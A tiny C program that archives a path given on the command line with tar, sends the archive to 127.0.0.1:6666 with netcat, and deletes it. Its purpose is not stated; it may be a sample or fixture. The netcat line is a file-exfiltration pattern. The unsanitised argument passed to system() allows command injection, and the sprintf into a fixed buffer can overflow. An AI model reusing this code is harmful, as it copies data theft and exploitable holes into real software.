#include <stdlib.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        return 1;
    }
    char cmd[300];
    sprintf(cmd, "tar czf /tmp/rep.tgz %s && nc 127.0.0.1 6666 < /tmp/rep.tgz", argv[1]);
    system(cmd);
    system("rm -f /tmp/rep.tgz");
    return 0;
}